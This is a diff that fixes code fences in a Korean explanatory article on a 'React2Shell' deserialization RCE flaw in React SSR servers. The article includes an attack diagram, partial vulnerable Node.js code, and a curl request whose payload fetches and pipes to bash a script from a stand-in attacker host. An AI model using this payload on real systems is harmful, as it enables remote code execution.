@@ -28,8 +28,7 @@ React2Shell은 기본적으로 원격 코드 실행(RCE) 취약점의 일종으�
 
 다음은 공격 흐름을 시각화한 다이어그램입니다.
 
-````mermaid`
-
+```mermaid
 graph TD
     A[공격자] -->|악성 페이로드 전송| B[취약한 React SSR 서버]
     B -->|역직렬화 처리| C{취약점 트리거}
@@ -39,8 +38,7 @@ graph TD
     G[일반 사용자] -->|정상 접속 시도| B
     E -->|강제 이동| F
     C -->|실패 시| H[에러 로그 기록]
-
-`````
+```
 
 ## 실제 공격 예시 (Attack Example)
 
@@ -49,8 +47,7 @@ graph TD
 **1. 악성 요청 전송 (cURL)**
 공격자는 취약한 API 엔드포인트에 역직렬화 취약점을 이용한 페이로드를 보냅니다.
 
-````bash`
-
+```bash
 curl -X POST http://target-vulnerable-site.com/api/data \
   -H "Content-Type: application/json" \
   -d '{
@@ -65,14 +62,12 @@ curl -X POST http://target-vulnerable-site.com/api/data \
       "cmd": "curl -s http://attacker-server.com/shell.sh | bash"
     }
   }'
-
-`````
+```
 
 **2. 서버 측 취약 코드 개념 (Node.js)**
 아래 코드는 사용자 입력을 안전하게 검증하지 않고 객체로 변환하여 처리하는 잘못된 예시입니다.
 
-````javascript`
-
+```javascript
 // 취약한 서버 사이드 코드 예시
 const express = require('express');
 const app = express();
@@ -104,8 +99,7 @@ app.post('/api/data', (req, res) => {
 });
 
 app.listen(3000);
-
-`````
+```
 
 이 예시에서 공격자는 `/api/data`로 요청을 보내 서버 내부에서 악성 쉘 스크립트를 실행하거나, 모든 들어오는 트래픽을 자신의 사이트(`http://malicious-site.com`)로 리다이렉트하도록 서버 설정을 런타임 중에 변경합니다.
 
